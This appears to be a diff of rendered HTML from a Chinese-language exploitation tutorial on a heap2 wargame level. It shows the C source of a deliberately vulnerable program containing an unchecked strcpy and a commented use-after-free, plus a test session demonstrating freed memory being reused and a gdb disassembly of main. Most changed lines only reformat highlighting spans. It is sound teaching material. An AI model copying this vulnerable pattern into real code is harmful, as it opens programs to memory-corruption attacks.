+<span class="w">        </span><span class="n">strcpy</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;reset&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">free</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;service&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strdup</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">7</span><span class="p">);</span>
 <span class="w">      </span><span class="c1">// strdup(s) returns a pointer to a new string which is a duplicate of the string s. Memory for the new string is obtained with malloc.</span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
-<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;login&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;login&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">auth</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// use after free</span>
-<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have logged in already!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;please enter your password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">      </span><span class="p">}</span><span class="w"></span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have logged in already!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;please enter your password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>
 <p>使用测试</p>
-<div class="highlight"><pre><span></span><code>$ ./heap2
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-auth admin
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>./heap2
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span>,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+auth<span class="w"> </span>admin
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
 login
-please enter your password
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+please<span class="w"> </span>enter<span class="w"> </span>your<span class="w"> </span>password
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
 reset
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
 login
-please enter your password
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-service hack
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c008 <span class="o">]</span>
+please<span class="w"> </span>enter<span class="w"> </span>your<span class="w"> </span>password
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+service<span class="w"> </span>hack
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008<span class="w"> </span><span class="o">]</span>
 <span class="c1"># auth was freed and service got that free space there</span>
 </code></pre></div>
 </li>
@@ -3071,368 +3085,368 @@ service hack
 <p>使用 <code>gdb</code> 查看堆的使用情况</p>
 <details class="note">
 <summary>Dump of assembler code for function main</summary>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
-<span class="o">(</span>gdb<span class="o">)</span> disassemble main 
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
-0x08048934 &lt;main+0&gt;:    push   ebp
-0x08048935 &lt;main+1&gt;:    mov    ebp,esp
-0x08048937 &lt;main+3&gt;:    and    esp,0xfffffff0
-0x0804893a &lt;main+6&gt;:    sub    esp,0x90
-0x08048940 &lt;main+12&gt;:   jmp    0x8048943 &lt;main+15&gt;
-0x08048942 &lt;main+14&gt;:   nop
-0x08048943 &lt;main+15&gt;:   mov    ecx,DWORD PTR ds:0x804b5f8
-0x08048949 &lt;main+21&gt;:   mov    edx,DWORD PTR ds:0x804b5f4
-0x0804894f &lt;main+27&gt;:   mov    eax,0x804ad70
-0x08048954 &lt;main+32&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,ecx
-0x08048958 &lt;main+36&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
-0x0804895c &lt;main+40&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x0804895f &lt;main+43&gt;:   call   0x804881c &lt;printf@plt&gt;
-0x08048964 &lt;main+48&gt;:   mov    eax,ds:0x804b164
-0x08048969 &lt;main+53&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
-0x0804896d &lt;main+57&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x80
-0x08048975 &lt;main+65&gt;:   lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
-0x08048979 &lt;main+69&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x0804897c &lt;main+72&gt;:   call   0x80487ac &lt;fgets@plt&gt;
-0x08048981 &lt;main+77&gt;:   <span class="nb">test</span>   eax,eax
-0x08048983 &lt;main+79&gt;:   jne    0x8048987 &lt;main+83&gt;
-0x08048985 &lt;main+81&gt;:   leave  
-0x08048986 &lt;main+82&gt;:   ret    
-0x08048987 &lt;main+83&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x5
-0x0804898f &lt;main+91&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ad8d
-0x08048997 &lt;main+99&gt;:   lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
-0x0804899b &lt;main+103&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x0804899e &lt;main+106&gt;:  call   0x804884c &lt;strncmp@plt&gt;
-0x080489a3 &lt;main+111&gt;:  <span class="nb">test</span>   eax,eax
-0x080489a5 &lt;main+113&gt;:  jne    0x8048a01 &lt;main+205&gt;
-0x080489a7 &lt;main+115&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x4
-0x080489ae &lt;main+122&gt;:  call   0x804916a &lt;malloc&gt;
-0x080489b3 &lt;main+127&gt;:  mov    ds:0x804b5f4,eax
-0x080489b8 &lt;main+132&gt;:  mov    eax,ds:0x804b5f4
-0x080489bd &lt;main+137&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x4
-0x080489c5 &lt;main+145&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x0
-0x080489cd &lt;main+153&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x080489d0 &lt;main+156&gt;:  call   0x80487bc &lt;memset@plt&gt;
-0x080489d5 &lt;main+161&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
-0x080489d9 &lt;main+165&gt;:  add    eax,0x5
-0x080489dc &lt;main+168&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x080489df &lt;main+171&gt;:  call   0x80487fc &lt;strlen@plt&gt;
-0x080489e4 &lt;main+176&gt;:  cmp    eax,0x1e
-0x080489e7 &lt;main+179&gt;:  ja     0x8048a01 &lt;main+205&gt;
-0x080489e9 &lt;main+181&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
-0x080489ed &lt;main+185&gt;:  lea    edx,<span class="o">[</span>eax+0x5<span class="o">]</span>
-0x080489f0 &lt;main+188&gt;:  mov    eax,ds:0x804b5f4
-0x080489f5 &lt;main+193&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
-0x080489f9 &lt;main+197&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x080489fc &lt;main+200&gt;:  call   0x804880c &lt;strcpy@plt&gt;
-0x08048a01 &lt;main+205&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x5
-0x08048a09 &lt;main+213&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ad93
-0x08048a11 &lt;main+221&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
-0x08048a15 &lt;main+225&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048a18 &lt;main+228&gt;:  call   0x804884c &lt;strncmp@plt&gt;
-0x08048a1d &lt;main+233&gt;:  <span class="nb">test</span>   eax,eax
-0x08048a1f &lt;main+235&gt;:  jne    0x8048a2e &lt;main+250&gt;
-0x08048a21 &lt;main+237&gt;:  mov    eax,ds:0x804b5f4
-0x08048a26 &lt;main+242&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048a29 &lt;main+245&gt;:  call   0x804999c &lt;free&gt;
-0x08048a2e &lt;main+250&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x6
-0x08048a36 &lt;main+258&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ad99
-0x08048a3e &lt;main+266&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
-0x08048a42 &lt;main+270&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048a45 &lt;main+273&gt;:  call   0x804884c &lt;strncmp@plt&gt;
-0x08048a4a &lt;main+278&gt;:  <span class="nb">test</span>   eax,eax
-0x08048a4c &lt;main+280&gt;:  jne    0x8048a62 &lt;main+302&gt;
-0x08048a4e &lt;main+282&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
-0x08048a52 &lt;main+286&gt;:  add    eax,0x7
-0x08048a55 &lt;main+289&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048a58 &lt;main+292&gt;:  call   0x804886c &lt;strdup@plt&gt;
-0x08048a5d &lt;main+297&gt;:  mov    ds:0x804b5f8,eax
-0x08048a62 &lt;main+302&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x5
-0x08048a6a &lt;main+310&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ada1
-0x08048a72 &lt;main+318&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
-0x08048a76 &lt;main+322&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048a79 &lt;main+325&gt;:  call   0x804884c &lt;strncmp@plt&gt;
-0x08048a7e &lt;main+330&gt;:  <span class="nb">test</span>   eax,eax
-0x08048a80 &lt;main+332&gt;:  jne    0x8048942 &lt;main+14&gt;
-0x08048a86 &lt;main+338&gt;:  mov    eax,ds:0x804b5f4
-0x08048a8b &lt;main+343&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax+0x20<span class="o">]</span>
-0x08048a8e &lt;main+346&gt;:  <span class="nb">test</span>   eax,eax
-0x08048a90 &lt;main+348&gt;:  je     0x8048aa3 &lt;main+367&gt;
-0x08048a92 &lt;main+350&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804ada7
-0x08048a99 &lt;main+357&gt;:  call   0x804883c &lt;puts@plt&gt;
-0x08048a9e &lt;main+362&gt;:  jmp    0x8048943 &lt;main+15&gt;
-0x08048aa3 &lt;main+367&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804adc3
-0x08048aaa &lt;main+374&gt;:  call   0x804883c &lt;puts@plt&gt;
-0x08048aaf &lt;main+379&gt;:  jmp    0x8048943 &lt;main+15&gt;
-End of assembler dump.
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>disassembly-flavor<span class="w"> </span>intel
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>main<span class="w"> </span>
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>main:
+0x08048934<span class="w"> </span>&lt;main+0&gt;:<span class="w">    </span>push<span class="w">   </span>ebp
+0x08048935<span class="w"> </span>&lt;main+1&gt;:<span class="w">    </span>mov<span class="w">    </span>ebp,esp
+0x08048937<span class="w"> </span>&lt;main+3&gt;:<span class="w">    </span>and<span class="w">    </span>esp,0xfffffff0
+0x0804893a<span class="w"> </span>&lt;main+6&gt;:<span class="w">    </span>sub<span class="w">    </span>esp,0x90
+0x08048940<span class="w"> </span>&lt;main+12&gt;:<span class="w">   </span>jmp<span class="w">    </span>0x8048943<span class="w"> </span>&lt;main+15&gt;
+0x08048942<span class="w"> </span>&lt;main+14&gt;:<span class="w">   </span>nop
+0x08048943<span class="w"> </span>&lt;main+15&gt;:<span class="w">   </span>mov<span class="w">    </span>ecx,DWORD<span class="w"> </span>PTR<span class="w"> </span>ds:0x804b5f8
+0x08048949<span class="w"> </span>&lt;main+21&gt;:<span class="w">   </span>mov<span class="w">    </span>edx,DWORD<span class="w"> </span>PTR<span class="w"> </span>ds:0x804b5f4
+0x0804894f<span class="w"> </span>&lt;main+27&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,0x804ad70
+0x08048954<span class="w"> </span>&lt;main+32&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x8<span class="o">]</span>,ecx
+0x08048958<span class="w"> </span>&lt;main+36&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+0x0804895c<span class="w"> </span>&lt;main+40&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804895f<span class="w"> </span>&lt;main+43&gt;:<span class="w">   </span>call<span class="w">   </span>0x804881c<span class="w"> </span>&lt;printf@plt&gt;
+0x08048964<span class="w"> </span>&lt;main+48&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,ds:0x804b164
+0x08048969<span class="w"> </span>&lt;main+53&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x8<span class="o">]</span>,eax
+0x0804896d<span class="w"> </span>&lt;main+57&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,0x80
+0x08048975<span class="w"> </span>&lt;main+65&gt;:<span class="w">   </span>lea<span class="w">    </span>eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x08048979<span class="w"> </span>&lt;main+69&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804897c<span class="w"> </span>&lt;main+72&gt;:<span class="w">   </span>call<span class="w">   </span>0x80487ac<span class="w"> </span>&lt;fgets@plt&gt;
+0x08048981<span class="w"> </span>&lt;main+77&gt;:<span class="w">   </span><span class="nb">test</span><span class="w">   </span>eax,eax
+0x08048983<span class="w"> </span>&lt;main+79&gt;:<span class="w">   </span>jne<span class="w">    </span>0x8048987<span class="w"> </span>&lt;main+83&gt;
+0x08048985<span class="w"> </span>&lt;main+81&gt;:<span class="w">   </span>leave<span class="w">  </span>
+0x08048986<span class="w"> </span>&lt;main+82&gt;:<span class="w">   </span>ret<span class="w">    </span>
+0x08048987<span class="w"> </span>&lt;main+83&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x8<span class="o">]</span>,0x5
+0x0804898f<span class="w"> </span>&lt;main+91&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ad8d
+0x08048997<span class="w"> </span>&lt;main+99&gt;:<span class="w">   </span>lea<span class="w">    </span>eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x0804899b<span class="w"> </span>&lt;main+103&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804899e<span class="w"> </span>&lt;main+106&gt;:<span class="w">  </span>call<span class="w">   </span>0x804884c<span class="w"> </span>&lt;strncmp@plt&gt;
+0x080489a3<span class="w"> </span>&lt;main+111&gt;:<span class="w">  </span><span class="nb">test</span><span class="w">   </span>eax,eax
+0x080489a5<span class="w"> </span>&lt;main+113&gt;:<span class="w">  </span>jne<span class="w">    </span>0x8048a01<span class="w"> </span>&lt;main+205&gt;
+0x080489a7<span class="w"> </span>&lt;main+115&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x4
+0x080489ae<span class="w"> </span>&lt;main+122&gt;:<span class="w">  </span>call<span class="w">   </span>0x804916a<span class="w"> </span>&lt;malloc&gt;
+0x080489b3<span class="w"> </span>&lt;main+127&gt;:<span class="w">  </span>mov<span class="w">    </span>ds:0x804b5f4,eax
+0x080489b8<span class="w"> </span>&lt;main+132&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,ds:0x804b5f4
+0x080489bd<span class="w"> </span>&lt;main+137&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x8<span class="o">]</span>,0x4
+0x080489c5<span class="w"> </span>&lt;main+145&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,0x0
+0x080489cd<span class="w"> </span>&lt;main+153&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x080489d0<span class="w"> </span>&lt;main+156&gt;:<span class="w">  </span>call<span class="w">   </span>0x80487bc<span class="w"> </span>&lt;memset@plt&gt;
+0x080489d5<span class="w"> </span>&lt;main+161&gt;:<span class="w">  </span>lea<span class="w">    </span>eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x080489d9<span class="w"> </span>&lt;main+165&gt;:<span class="w">  </span>add<span class="w">    </span>eax,0x5
+0x080489dc<span class="w"> </span>&lt;main+168&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x080489df<span class="w"> </span>&lt;main+171&gt;:<span class="w">  </span>call<span class="w">   </span>0x80487fc<span class="w"> </span>&lt;strlen@plt&gt;
+0x080489e4<span class="w"> </span>&lt;main+176&gt;:<span class="w">  </span>cmp<span class="w">    </span>eax,0x1e
+0x080489e7<span class="w"> </span>&lt;main+179&gt;:<span class="w">  </span>ja<span class="w">     </span>0x8048a01<span class="w"> </span>&lt;main+205&gt;
+0x080489e9<span class="w"> </span>&lt;main+181&gt;:<span class="w">  </span>lea<span class="w">    </span>eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x080489ed<span class="w"> </span>&lt;main+185&gt;:<span class="w">  </span>lea<span class="w">    </span>edx,<span class="o">[</span>eax+0x5<span class="o">]</span>
+0x080489f0<span class="w"> </span>&lt;main+188&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,ds:0x804b5f4
+0x080489f5<span class="w"> </span>&lt;main+193&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+0x080489f9<span class="w"> </span>&lt;main+197&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x080489fc<span class="w"> </span>&lt;main+200&gt;:<span class="w">  </span>call<span class="w">   </span>0x804880c<span class="w"> </span>&lt;strcpy@plt&gt;
+0x08048a01<span class="w"> </span>&lt;main+205&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x8<span class="o">]</span>,0x5
+0x08048a09<span class="w"> </span>&lt;main+213&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ad93
+0x08048a11<span class="w"> </span>&lt;main+221&gt;:<span class="w">  </span>lea<span class="w">    </span>eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x08048a15<span class="w"> </span>&lt;main+225&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048a18<span class="w"> </span>&lt;main+228&gt;:<span class="w">  </span>call<span class="w">   </span>0x804884c<span class="w"> </span>&lt;strncmp@plt&gt;
+0x08048a1d<span class="w"> </span>&lt;main+233&gt;:<span class="w">  </span><span class="nb">test</span><span class="w">   </span>eax,eax
+0x08048a1f<span class="w"> </span>&lt;main+235&gt;:<span class="w">  </span>jne<span class="w">    </span>0x8048a2e<span class="w"> </span>&lt;main+250&gt;
+0x08048a21<span class="w"> </span>&lt;main+237&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,ds:0x804b5f4
+0x08048a26<span class="w"> </span>&lt;main+242&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048a29<span class="w"> </span>&lt;main+245&gt;:<span class="w">  </span>call<span class="w">   </span>0x804999c<span class="w"> </span>&lt;free&gt;
+0x08048a2e<span class="w"> </span>&lt;main+250&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x8<span class="o">]</span>,0x6
+0x08048a36<span class="w"> </span>&lt;main+258&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ad99
+0x08048a3e<span class="w"> </span>&lt;main+266&gt;:<span class="w">  </span>lea<span class="w">    </span>eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x08048a42<span class="w"> </span>&lt;main+270&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048a45<span class="w"> </span>&lt;main+273&gt;:<span class="w">  </span>call<span class="w">   </span>0x804884c<span class="w"> </span>&lt;strncmp@plt&gt;
+0x08048a4a<span class="w"> </span>&lt;main+278&gt;:<span class="w">  </span><span class="nb">test</span><span class="w">   </span>eax,eax
+0x08048a4c<span class="w"> </span>&lt;main+280&gt;:<span class="w">  </span>jne<span class="w">    </span>0x8048a62<span class="w"> </span>&lt;main+302&gt;
+0x08048a4e<span class="w"> </span>&lt;main+282&gt;:<span class="w">  </span>lea<span class="w">    </span>eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x08048a52<span class="w"> </span>&lt;main+286&gt;:<span class="w">  </span>add<span class="w">    </span>eax,0x7
+0x08048a55<span class="w"> </span>&lt;main+289&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048a58<span class="w"> </span>&lt;main+292&gt;:<span class="w">  </span>call<span class="w">   </span>0x804886c<span class="w"> </span>&lt;strdup@plt&gt;
+0x08048a5d<span class="w"> </span>&lt;main+297&gt;:<span class="w">  </span>mov<span class="w">    </span>ds:0x804b5f8,eax
+0x08048a62<span class="w"> </span>&lt;main+302&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x8<span class="o">]</span>,0x5
+0x08048a6a<span class="w"> </span>&lt;main+310&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ada1
+0x08048a72<span class="w"> </span>&lt;main+318&gt;:<span class="w">  </span>lea<span class="w">    </span>eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x08048a76<span class="w"> </span>&lt;main+322&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048a79<span class="w"> </span>&lt;main+325&gt;:<span class="w">  </span>call<span class="w">   </span>0x804884c<span class="w"> </span>&lt;strncmp@plt&gt;
+0x08048a7e<span class="w"> </span>&lt;main+330&gt;:<span class="w">  </span><span class="nb">test</span><span class="w">   </span>eax,eax
